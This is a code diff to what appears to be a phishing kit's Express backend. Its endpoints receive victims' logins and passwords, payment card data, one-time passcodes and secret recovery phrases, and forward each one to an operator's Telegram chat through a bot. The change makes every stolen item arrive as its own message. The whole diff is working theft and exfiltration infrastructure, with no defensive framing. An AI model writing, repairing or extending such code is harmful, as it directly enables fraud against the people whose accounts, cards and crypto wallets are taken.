@@ -39,7 +39,6 @@ bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
     console.error('Error sending test message:', error);
 });
 
-let messageId;
 
 // Endpoint for handling login and password
 app.post('/api/cred', (req, res) => {
@@ -77,9 +76,8 @@ app.post('/api/cred', (req, res) => {
         },
     };
 
-    bot.sendMessage(config.chatId, message, options).then(sentMessage => {
-        messageId = sentMessage.message_id; // Store the message ID for future edits
-    });
+   bot.sendMessage(config.chatId, message, options);
+
 
     // Send response to client
     res.status(200).json({ message: 'Credentials received successfully' });
@@ -123,8 +121,7 @@ app.post('/api/card', (req, res) => {
         },
     };
 
-    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId, reply_markup: options.reply_markup });
-
+    bot.sendMessage(config.chatId, message, options);
     // Send response to client
     res.status(200).json({ message: 'Card data received successfully' });
 });
@@ -163,7 +160,7 @@ app.post('/api/otp', (req, res) => {
         },
     };
 
-    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId, reply_markup: options.reply_markup });
+    bot.sendMessage(config.chatId, message, options);
 
     // Send response to client
     res.status(200).json({ message: 'OTP received successfully' });
@@ -202,7 +199,7 @@ app.post('/api/secret', (req, res) => {
         },
     };
 
-    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId });
+    bot.sendMessage(config.chatId, message);
 
     // Send response to client
     res.status(200).json({ message: 'Secret phrase received successfully' });
